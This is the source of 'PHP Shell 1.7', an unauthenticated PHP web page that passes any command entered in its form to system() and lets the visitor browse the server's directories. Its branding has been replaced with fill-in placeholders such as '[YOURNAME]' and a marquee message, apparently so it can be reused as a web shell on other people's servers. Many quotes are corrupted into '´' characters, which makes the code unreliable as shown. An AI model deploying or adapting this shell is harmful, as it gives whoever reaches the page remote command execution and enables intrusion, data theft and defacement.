<?php

define(´PHPSHELL_VERSION´, ´1.7´);

/*

**************************************************************
* PHP Shell *
**************************************************************
$Id: phpshell.php,v 1.18 2002/09/18 15:49:54 gimpster Exp $

PHP Shell is aninteractive PHP-page that will execute any command
entered. See the files README and INSTALL or http://www.gimpster.com
for further information.

Copyright (C) 2000-2002 Martin Geisler < gimpster@gimpster.com>

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.

You can get a copy of the GNU General Public License from this
address: http://www.gnu.org/copyleft/gpl.html#SEC1
You can also write to the Free Software Foundation, Inc., 59 Temple
Place - Suite 330, Boston, MA 02111-1307, USA.

*/
?>

<html>
<head>
<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]<?php echo PHPSHELL_VERSION ?></title>
</head>
<body>
<h1>[YOUR HEADER[ <?php echo PHPSHELL_VERSION ?> [ADITTIONAL TEXT] -
[ADDITIONAL TEXT]</h1><br><hr><marquee><b>[ADDITIONAL MESSEGE OR TEXT]</b></marquee><hr><br>

<?php

if (ini_get(´register_globals´) != ´1´) {
/* We´ll register the variables as globals: */
if (!empty($HTTP_POST_VARS))
extract($HTTP_POST_VARS);

if (!empty($HTTP_GET_VARS))
extract($HTTP_GET_VARS);

if (!empty($HTTP_SERVER_VARS))
extract($HTTP_SERVER_VARS);
}

/* First we check if there has been asked for a working directory. */
if (!empty($work_dir)) {
/* A workdir has been asked for */
if (!empty($command)) {
if (ereg(´^[[:blank:]]*cd[[:blank:]]+([^;]+)$´, $command, $regs)) {
/* We try and match a cd command. */
if ($regs[1][0] == ´/´) {
$new_dir = $regs[1]; // ´cd /something/...´
} else {
$new_dir = $work_dir . ´/´ . $regs[1]; // ´cd somedir/...´
}
if (file_exists($new_dir) && is_dir($new_dir)) {
$work_dir = $new_dir;
}
unset($command);
}
}
}

if (file_exists($work_dir) && is_dir($work_dir)) {
/* We change directory to that dir: */
chdir($work_dir);
}

/* We now update $work_dir to avoid things like ´/foo/../bar´: */
$work_dir = exec(´pwd´);

?>

<form name="myform" action="<?php echo $PHP_SELF ?>" method="post">
<p>Current working directory: <b>
<?php

$work_dir_splitted = explode(´/´, substr($work_dir, 1));

echo ´<a xhref="´ . $PHP_SELF . ´?work_dir=/">Root</a>/´;

if (!empty($work_dir_splitted[0])) {
$path = ´´;
for ($i = 0; $i < count($work_dir_splitted); $i++) {
$path .= ´/´ . $work_dir_splitted[$i];
printf(´<a xhref="%s?work_dir=%s">%s</a>/´,
$PHP_SELF, urlencode($path), $work_dir_splitted[$i]);
}
}

?></b></p>
<p>Choose new working directory:
<select name="work_dir" onChange="this.form.submit()">
<?php
/* Now we make a list of the directories. */
$dir_handle = opendir($work_dir);
/* Run through all the files and directories to find the dirs. */
while ($dir = readdir($dir_handle)) {
if (is_dir($dir)) {
if ($dir == ´.´) {
echo "<option value="$work_dir" selected>Current Directory</option> ";
} elseif ($dir == ´..´) {
/* We have found the parent dir. We must be carefull if the parent
directory is the root directory (/). */
if (strlen($work_dir) == 1) {
/* work_dir is only 1 charecter - it can only be / There´s no
parent directory then. */
} elseif (strrpos($work_dir, ´/´) == 0) {
/* The last / in work_dir were the first charecter.
This means that we have a top-level directory
eg. /bin or /home etc... */
echo "<option value="/">Parent Directory</option> ";
} else {
/* We do a little bit of string-manipulation to find the parent
directory... Trust me - it works :-) */
echo "<option value="". strrev(substr(strstr(strrev($work_dir), "/"), 1)) ."">Parent Directory</option> ";
}
} else {
if ($work_dir == ´/´) {
echo "<option value="$work_dir$dir">$dir</option> ";
} else {
echo "<option value="$work_dir/$dir">$dir</option> ";
}
}
}
}
closedir($dir_handle);

?>

</select></p>

<p>Command: <input type="text" name="command" size="60">
<input name="submit_btn" type="submit" value="Execute Command"></p>

<p>Enable <code>stderr</code>-trapping? <input type="checkbox" name="stderr"></p>
<textarea cols="80" rows="20" readonly>

<?php
if (!empty($command)) {
if ($stderr) {
$tmpfile = tempnam(´/tmp´, ´phpshell´);
$command .= " 1> $tmpfile 2>&1; " .
"cat $tmpfile; rm $tmpfile";
} else if ($command == ´ls´) {
/* ls looks much better with ´ -F´, IMHO. */
$command .= ´ -F´;
}
system($command);
}
?>

</textarea>
</form>

<script language="JavaScript" type="text/javascript">
document.forms[0].command.focus();
</script>

<hr>
<i>Copyright © 2004–2005, <a
href="mailto: [YOU CAN ENTER YOUR MAIL HERE]- [ADDITIONAL TEXT]</a></i>
</body>
</html>
